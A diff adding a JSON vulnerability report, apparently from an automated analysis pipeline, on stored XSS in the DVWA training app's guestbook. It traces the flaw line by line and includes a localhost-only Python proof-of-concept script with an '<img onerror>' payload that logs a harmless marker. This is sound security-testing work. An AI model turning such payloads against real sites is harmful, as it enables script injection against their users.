@@ -1,0 +1,244 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "XSS-005",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v2",
+  "analysis_stage": "parent",
+  "received_packet_ids": ["XSS-005-P1"],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "在 security=low（即片段A/low.php 被包含）这一配置内，输入(片段A第5-6行)、SQL语境转义(第10/13行)、数据库写入(第16行)、读取(片段C第3行)、非impossible分支的原始赋值(第14-15行)、HTML拼接(第18行)、页面组装(片段B第72行)与输出(第85行)均有逐行证据，路径静态完整；因此对该配置给high。未决的是实际部署等级、medium/high写入实现与dvwaHtmlEcho实现，故verdict保持待验证。"
+  },
+  "findings": [
+    {
+      "finding_id": "XSS-005-F1",
+      "vulnerability_type": "XSS",
+      "locations": [
+        {
+          "fragment_id": "XSS-005-A",
+          "line_start": 3,
+          "line_end": 3,
+          "quote": "if( isset( $_POST[ 'btnSign' ] ) ) {"
+        },
+        {
+          "fragment_id": "XSS-005-A",
+          "line_start": 5,
+          "line_end": 5,
+          "quote": "$message = trim( $_POST[ 'mtxMessage' ] );"
+        },
+        {
+          "fragment_id": "XSS-005-A",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "$name    = trim( $_POST[ 'txtName' ] );"
+        },
+        {
+          "fragment_id": "XSS-005-A",
+          "line_start": 10,
+          "line_end": 10,
+          "quote": "mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $message )"
+        },
+        {
+          "fragment_id": "XSS-005-A",
+          "line_start": 13,
+          "line_end": 13,
+          "quote": "mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $name )"
+        },
+        {
+          "fragment_id": "XSS-005-A",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"
+        },
+        {
+          "fragment_id": "XSS-005-B",
+          "line_start": 37,
+          "line_end": 37,
+          "quote": "require_once DVWA_WEB_PAGE_TO_ROOT . \"vulnerabilities/xss_s/source/{$vulnerabilityFile}\";"
+        },
+        {
+          "fragment_id": "XSS-005-B",
+          "line_start": 48,
+          "line_end": 48,
+          "quote": "<input name=\\\"txtName\\\" type=\\\"text\\\" size=\\\"30\\\" maxlength=\\\"10\\\">"
+        },
+        {
+          "fragment_id": "XSS-005-B",
+          "line_start": 52,
+          "line_end": 52,
+          "quote": "<textarea name=\\\"mtxMessage\\\" cols=\\\"50\\\" rows=\\\"3\\\" maxlength=\\\"50\\\"></textarea>"
+        },
+        {
+          "fragment_id": "XSS-005-B",
+          "line_start": 57,
+          "line_end": 57,
+          "quote": "<input name=\\\"btnSign\\\" type=\\\"submit\\\" value=\\\"Sign Guestbook\\\" onclick=\\\"return validateGuestbookForm(this.form);\\\" />"
+        },
+        {
+          "fragment_id": "XSS-005-C",
+          "line_start": 3,
+          "line_end": 3,
+          "quote": "$query  = \"SELECT name, comment FROM guestbook\";"
+        },
+        {
+          "fragment_id": "XSS-005-C",
+          "line_start": 9,
+          "line_end": 9,
+          "quote": "if( dvwaSecurityLevelGet() == 'impossible' ) {"
+        },
+        {
+          "fragment_id": "XSS-005-C",
+          "line_start": 14,
+          "line_end": 14,
+          "quote": "$name    = $row[0];"
+        },
+        {
+          "fragment_id": "XSS-005-C",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$comment = $row[1];"
+        },
+        {
+          "fragment_id": "XSS-005-C",
+          "line_start": 18,
+          "line_end": 18,
+          "quote": "<div id=\\\"guestbook_comments\\\">Name: {$name}<br />\" . \"Message: {$comment}<br /></div>"
+        },
+        {
+          "fragment_id": "XSS-005-B",
+          "line_start": 72,
+          "line_end": 72,
+          "quote": "\" . dvwaGuestbook() . \""
+        },
+        {
+          "fragment_id": "XSS-005-B",
+          "line_start": 85,
+          "line_end": 85,
+          "quote": "dvwaHtmlEcho( $page );"
+        },
+        {
+          "fragment_id": "XSS-005-D",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "if (isset($_COOKIE['security'])) {"
+        },
+        {
+          "fragment_id": "XSS-005-D",
+          "line_start": 7,
+          "line_end": 7,
+          "quote": "return $_COOKIE[ 'security' ];"
+        },
+        {
+          "fragment_id": "XSS-005-D",
+          "line_start": 13,
+          "line_end": 13,
+          "quote": "return $_DVWA[ 'default_security_level' ];"
+        },
+        {
+          "fragment_id": "XSS-005-D",
+          "line_start": 17,
+          "line_end": 17,
+          "quote": "return 'impossible';"
+        }
+      ],
+      "data_flow": [
+        "1) 入口(片段B第44-57行)：表单 method=\"post\" 提交 txtName(第48行，客户端 maxlength=\"10\")、mtxMessage(第52行，客户端 maxlength=\"50\") 与 btnSign(第57行)；两处 maxlength 只是浏览器侧限制。",
+        "2) 读取(片段A第3-6行)：isset($_POST['btnSign']) 成立时，$message=trim($_POST['mtxMessage'])、$name=trim($_POST['txtName'])，值完全来自请求。",
+        "3) 处理(片段A第9-13行)：$message 先 stripslashes，然后两个值都调用 mysqli_real_escape_string。该函数只转义 SQL 字符串语境，不改变 <、>、\"、' 等 HTML 元字符，对浏览器输出没有编码作用。",
+        "4) 持久化(片段A第16-17行)：值被直接插入 INSERT INTO guestbook ( comment, name )，留言落库。",
+        "5) 分支(片段B第22-37行)：按 dvwaSecurityLevelGet() 选择 low/medium/high/impossible 源文件；片段A是当前选定的写入片段，只有在选中 low.php 时才被包含并执行上述写入。",
+        "6) 读取(片段C第3-4行)：dvwaGuestbook() 执行 SELECT name, comment FROM guestbook，读取同一批库内行。",
+        "7) 输出分支(片段C第9-15行)：仅当 dvwaSecurityLevelGet() == 'impossible' 时对 $row[0]/$row[1] 调用 htmlspecialchars；else 分支把原始字段赋给 $name/$comment，未做任何 HTML 编码。",
+        "8) 拼接(片段C第18行)：$name/$comment 以字符串插值进入 \"<div id=\\\"guestbook_comments\\\">Name: {$name}<br />Message: {$comment}<br /></div>\"，位置是元素内容上下文，标签会被浏览器解析。",
+        "9) 组装与输出(片段B第72、85行)：dvwaGuestbook() 的返回值拼接到 $page['body']，随后 dvwaHtmlEcho($page) 输出页面，拼接结果作为 HTML 交给浏览器。",
+        "10) 配置来源(片段D第6-7、13、17行)：安全等级优先取自客户端可写的 $_COOKIE['security']，否则取 $_DVWA['default_security_level']，两者都缺失时返回 'impossible'；即是否进入编码分支由 cookie/配置决定。",
+        "11) 观察点：写入后再次 GET 留言页，响应中 <div id=\"guestbook_comments\"> 的 Message: 之后应出现未编码的候选标签；浏览器解析到该标签时 onerror 执行 console.log('LLM_LAB_XSS')，页面结构与 console 输出即取证对象。"
+      ],
+      "principle": "存储型XSS：写入片段只做了 SQL 语境转义（stripslashes + mysqli_real_escape_string），未做 HTML 输出编码；读取片段仅在 security=impossible 时对数据库字段调用 htmlspecialchars，low/medium/high 分支把数据库值原样插值进 HTML 元素内容，最终经 dvwaHtmlEcho 输出到浏览器。SQL 转义与 HTML 编码的作用域不同，前者不会阻止 <img onerror> 被解析执行；安全等级又来自客户端 cookie，配置分支可被控制。",
+      "impact": "在 security=low 配置下，任何能写入留言簿的已登录用户在访客浏览器中执行脚本，脚本在 DVWA 源内运行，可读取该页 DOM、以受害者身份发起同源请求、篡改页面内容。本次教学验证只使用 console.log('LLM_LAB_XSS') 无害标记，不读取 Cookie、不外传数据、不植入持久控制。",
+      "preconditions": [
+        "security 等级为 low（cookie security=low，或禁用认证时 $_DVWA['default_security_level']=low），使片段B第37行包含 low.php（片段A）作为写入处理器；medium/high/impossible 的写入实现未提供。",
+        "请求通过 dvwaPageStartup( array( 'authenticated' ) )（片段B第6行），即验证者持有有效 DVWA 会话；低级别下表单无 CSRF token（片段B第63-64行只有 impossible 追加 tokenField）。",
+        "mysqli 连接成功（片段B第14行 dvwaDatabaseConnect()）且 guestbook 表存在，列长度足以容纳载荷。",
+        "写入与读取使用同一数据库实例，受害者之后再访问 /vulnerabilities/xss_s/ 页面以触发解析。",
+        "客户端 maxlength 不构成服务端限制；载荷按 message 字段 50 字符的客户端限制设计（46 字符），实际列宽需验证。"
+      ],
+      "counterexamples": [
+        "片段C第9-11行：若 dvwaSecurityLevelGet() 返回 'impossible'，两个字段都经 htmlspecialchars 处理，本路径不再输出原始标签；这是同一代码在另一配置下的有效防护。",
+        "片段D第6-7、17行：无 security cookie 且配置缺失时默认返回 'impossible'，写入侧会包含 impossible.php 而非片段A，读取侧也进入编码分支，目标路径不成立。",
+        "片段B第22-37行：medium.php/high.php/impossible.php 的写入实现未提供；若实际部署为这些版本，不能把片段A的 trim/stripslashes/mysqli_real_escape_string 行为外推到它们，需补代码后重判。",
+        "dvwaHtmlEcho/dvwaPageNewGrab 的完整实现在 context/dvwaPage.inc.php，未随包提供；若渲染器对 page.body 再做 HTML 编码，拼接结果不会进入 HTML 解析上下文，需以该文件证实。",
+        "客户端 maxlength=10/50 与 validateGuestbookForm 只在浏览器侧生效，不是服务端反例；但若 guestbook 列定义短于载荷，插入可能被截断，需以表结构确认而非假定。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# XSS-005 / DVWA stored-XSS harmless-marker verification draft (local lab only).\n# Python 3.8+, standard library only. Never prints Cookie/token values.\n\nimport argparse\nimport re\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\nPAGE_PATH = \"/vulnerabilities/xss_s/\"\nNAME_VALUE = \"LLM_LAB\"\nPAYLOAD = \"<img src=x onerror=console.log('LLM_LAB_XSS')>\"\nROW_RE = re.compile(\n    r'<div id=\"guestbook_comments\">Name:\\s*(?P<name>.*?)<br />\\s*'\n    r'Message:\\s*(?P<comment>.*?)<br /></div>',\n    re.S,\n)\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef load_cookie(path):\n    with open(path, \"r\", encoding=\"utf-8\") as fh:\n        return fh.read().strip()\n\n\ndef fetch(url, cookie, data=None, timeout=10):\n    req = urllib.request.Request(url, data=data, method=\"POST\" if data else \"GET\")\n    req.add_header(\"Cookie\", cookie)\n    if data:\n        req.add_header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    opener = urllib.request.build_opener(NoRedirect)\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            return resp.status, resp.read().decode(\"utf-8\", \"replace\")\n    except urllib.error.HTTPError as exc:\n        body = exc.read().decode(\"utf-8\", \"replace\") if exc.fp else \"\"\n        return exc.code, body\n\n\ndef rows(html):\n    return [m.groupdict() for m in ROW_RE.finditer(html)]\n\n\ndef find_probe(all_rows):\n    return [r for r in all_rows if r[\"name\"].strip() == NAME_VALUE]\n\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--base-url\", required=True, help=\"e.g. http://127.0.0.1:8080\")\n    ap.add_argument(\"--cookie-file\", required=True,\n                    help=\"local file holding the Cookie header (PHPSESSID=...; security=low)\")\n    ap.add_argument(\"--security\", default=\"low\",\n                    help=\"value used for the security cookie if absent\")\n    args = ap.parse_args()\n\n    parsed = urllib.parse.urlparse(args.base_url)\n    if parsed.scheme not in (\"http\", \"https\") or parsed.hostname not in ALLOWED_HOSTS:\n        sys.exit(\"refusing non-local target: %r\" % args.base_url)\n\n    cookie = load_cookie(args.cookie_file)\n    if \"security=\" not in cookie:\n        cookie = cookie.rstrip(\"; \") + \"; security=\" + args.security\n    url = args.base_url.rstrip(\"/\") + PAGE_PATH\n\n    status, html = fetch(url, cookie)\n    print(\"[1] baseline GET status=%s rows=%d marker_present=%s\"\n          % (status, len(rows(html)), PAYLOAD in html))\n    if find_probe(rows(html)):\n        print(\"    note: a row named %s already exists; delete it before writing\" % NAME_VALUE)\n\n    body = urllib.parse.urlencode({\n        \"txtName\": NAME_VALUE,\n        \"mtxMessage\": PAYLOAD,\n        \"btnSign\": \"Sign Guestbook\",\n    }).encode(\"utf-8\")\n    status, html = fetch(url, cookie, data=body)\n    print(\"[2] write POST status=%s\" % status)\n\n    status, html = fetch(url, cookie)\n    probe = find_probe(rows(html))\n    print(\"[3] read GET status=%s probe_rows=%d\" % (status, len(probe)))\n    if not probe:\n        sys.exit(\"probe row not found: check session/login, DB state, security level, \"\n                 \"or whether the included write handler is fragment A (low.php)\")\n\n    comment = probe[0][\"comment\"]\n    print(\"    stored comment field: %r\" % comment)\n    print(\"    raw_payload_in_field=%s encoded_lt_in_field=%s\"\n          % (PAYLOAD in comment, \"&lt;img\" in comment))\n\n    imp_cookie = re.sub(r\"security=[^;]+\", \"security=impossible\", cookie)\n    status, html = fetch(url, imp_cookie)\n    imp = find_probe(rows(html))\n    enc = imp[0][\"comment\"] if imp else \"\"\n    print(\"[4] control GET status=%s encoded_lt=%s raw_payload=%s\"\n          % (status, \"&lt;img\" in enc, PAYLOAD in enc))\n\n    print(\"[5] browser step: open %s in the logged-in browser and watch DevTools \"\n          \"console for LLM_LAB_XSS; the HTTP evidence above is not execution evidence\" % url)\n    print(\"[6] cleanup: DELETE FROM guestbook WHERE name = '%s'; then repeat step [3] \"\n          \"to confirm the probe row is gone (do not use btnClear, it truncates all rows)\"\n          % NAME_VALUE)\n\n\nif __name__ == \"__main__\":\n    main()\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅标准库：argparse、re、sys、urllib",
+          "可访问的授权本地 DVWA 实例与已登录会话 Cookie（由验证人员以本地文件提供）",
+          "目标 security 等级为 low，使写入侧包含片段A（low.php）"
+        ],
+        "parameters": [
+          "--base-url：如 http://127.0.0.1:8080，脚本仅接受 localhost、127.0.0.1、::1 且不自动跟随重定向",
+          "--cookie-file：本地保存的 Cookie 请求头（含 PHPSESSID 与 security=low），不写入版本库、不回显",
+          "--security：Cookie 中缺少 security 时补充的等级值，默认 low",
+          "POST 字段 txtName、mtxMessage、btnSign：来自片段B第48、52、57行",
+          "页面路径 /vulnerabilities/xss_s/：由片段B第37行 source 相对路径与第215行 page_id 推断，需按实际部署确认"
+        ],
+        "steps": [
+          "准备：在授权本地靶场以已登录会话导出浏览器 Cookie 到仓库外的本地文件（如 PHPSESSID=...; security=low），确认 security 等级为 low。",
+          "在靶场环境运行：python xss005_poc.py --base-url http://127.0.0.1:<port> --cookie-file ./local_cookie.txt --security low。",
+          "读 [1] 基线：记录 rows 数与 marker_present，确认不存在 name=LLM_LAB 的留言作为对照。",
+          "读 [2] 写入状态与 [3] 读取结果：检查 probe_rows>=1、stored comment field 的 repr 逐字含 <img src=x onerror=console.log('LLM_LAB_XSS')>，且 raw_payload_in_field=True、encoded_lt_in_field=False。",
+          "读 [4] 配置对照：security=impossible 时应 encoded_lt=True、raw_payload=False，说明差异来自片段C第9-11行的编码分支而非载荷本身。",
+          "人工浏览器：登录后在目标 URL 打开留言页，DevTools Console 应打印 LLM_LAB_XSS，同时 Network 无新增外发请求；保存截图、浏览器版本与 security 值。",
+          "清理：用靶场数据库账号执行 DELETE FROM guestbook WHERE name='LLM_LAB'（定位到本次测试行，不用 btnClear 的全表 TRUNCATE），再执行步骤3确认该行消失，并保存清理前后查询输出。"
+        ],
+        "expected_observation": "GET /vulnerabilities/xss_s/ 返回的 HTML 中，<div id=\"guestbook_comments\"> 内 Name: LLM_LAB 对应的 Message: 字段原样包含 <img src=x onerror=console.log('LLM_LAB_XSS')>，未被转义为 &lt;img；浏览器加载该页时 img 加载失败触发 onerror，DevTools Console 打印 LLM_LAB_XSS；在 security=impossible 对照下，同一字段显示为 &lt;img src=x ...&gt; 的编码文本且不执行。",
+        "success_criteria": "1) 写入后再次 GET 的响应 HTML 中，guestbook_comments 区块内 Message: 之后逐字出现未编码的 <img src=x onerror=console.log('LLM_LAB_XSS')>，且该区块不含 &lt;img；2) 对照成立：写入前同一页面不存在 name=LLM_LAB 的行，写入后才出现该行，证明标记来自本次写入而非页面自带内容；3) 配置对照成立：同一会话改用 security=impossible 的 cookie 读取时，同一行字段变为 &lt;img 编码形式，说明差异由片段C第9-11行编码分支造成；4) 浏览器观察（人工）：在已登录浏览器打开目标页，Console 输出 LLM_LAB_XSS，且无 Cookie 被读取、无外发请求、无持久控制；5) 清理验证：DELETE FROM guestbook WHERE name='LLM_LAB' 后重新 GET，该行与标记消失。",
+        "limitations": [
+          "脚本只负责提交与回读并解析 guestbook_comments 区域；浏览器执行必须人工观察，HTTP 200 或响应含标记不等于脚本执行。",
+          "会话需人工登录后用本地文件提供 Cookie；脚本不实现登录、不处理 token（片段B第63-64行仅在 impossible 时追加 tokenField）。",
+          "脚本不连接数据库也不调用 btnClear（片段B第16-18行为 TRUNCATE guestbook，会清空全部留言）；定向清理需数据库凭据并手工执行。",
+          "载荷 46 字符，适配 mtxMessage 的客户端 maxlength=50；服务端无长度校验，但 guestbook 列宽未知，若被截断需缩短载荷或换用 name 字段（其 maxlength=10 同样仅为客户端限制）。",
+          "未在真实 DVWA 实例运行，脚本未经运行验证；PHP/MySQL 版本、security 默认值、表结构需在验证时记录。",
+          "页面路径 /vulnerabilities/xss_s/ 由片段B第37行 source 相对路径与 page_id 推断，若部署在子目录需按实际路径调整。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "写入版本 medium.php、high.php、impossible.php 的源码未提供，无法判断这些配置下的过滤强度与路径可达性。",
+    "context/dvwaPage.inc.php 中 dvwaHtmlEcho、dvwaPageNewGrab、tokenField 的实现未提供，输出是否再次编码无法从包内证实。",
+    "运行配置未提供：$_DVWA 的 default_security_level 与 disable_authentication、mysqli 连接参数、PHP/MySQL 版本、guestbook 表结构与列长度/字符集。",
+    "实际请求路径与部署子目录未在包内给出，只有 source 相对路径与 page_id。",
+    "验证时的浏览器类型/版本、登录账号与难度配置未给出。"
+  ],
+  "risk_notes": [
+    "片段B第16-19行：btnClear 通过 POST 直接执行 TRUNCATE guestbook，且 low/medium/high 下表单无 token（仅 impossible 第63-64行追加 tokenField），存在 CSRF 清空留言簿与数据破坏风险，属本次XSS范围之外。",
+    "片段A第16-17行以字符串拼接构造 INSERT，当前依赖 mysqli_real_escape_string；若改到数字上下文、不同字符集或未初始化连接，存在SQL注入风险，且 die(mysqli_error(...)) 会回显数据库错误信息。",
+    "片段D第6-7行把安全等级取自客户端 cookie，攻击者可自行把等级降为 low，从而绕开 impossible 分支的 htmlspecialchars；这是安全配置风险，会放大本XSS候选的影响范围。",
+    "片段A第16-17行写入前无服务端长度校验，客户端 maxlength 可绕过，可能造成超长留言与存储滥用。"
+  ],
+  "quality_notes": [
+    "片段C第10-11行 htmlspecialchars 未显式传入 flags 与 encoding，依赖 default_charset；PHP 8.1 起默认 flags 变化，编码行为随版本不同。",
+    "片段A第19行 mysql_close() 被注释，同时代码仍通过全局 ___mysqli_ston 兼容层使用 mysqli，属过时/兼容层写法。",
+    "片段B第44行表单标签 name=\"guestform\" 之后多出一个引号，HTML 属性结构不严谨。",
+    "片段B第48、52行依赖客户端 maxlength 约束输入长度，服务端无对应校验。"
+  ],
+  "limitations": [
+    "本次仅为静态分析：POC 为草案、execution_status=未运行、runtime_evidence 为空，未在真实实例提交或回读。",
+    "结论限定于 security=low 且片段A（low.php）被包含的写入路径；不能外推到未提供的 medium/high/impossible 写入实现。",
+    "dvwaHtmlEcho 未提供，page.body 原样输出依据的是调用点与参数命名，需以 context/dvwaPage.inc.php 证实。",
+    "数据库持久化后被 dvwaGuestbook() 读取由同一 guestbook 表与片段间调用关系支持，但实际连接与表结构未实测。",
+    "客户端 maxlength 被视为非服务端防护；载荷长度按 mtxMessage 的 50 字符客户端限制设计，实际列宽未知。",
+    "同一父样本仅收到一个输入包（1/1），未收到其它写入版本片段，故按单包事实给出父样本综合对象。"
+  ],
+  "runtime_evidence": []
+}
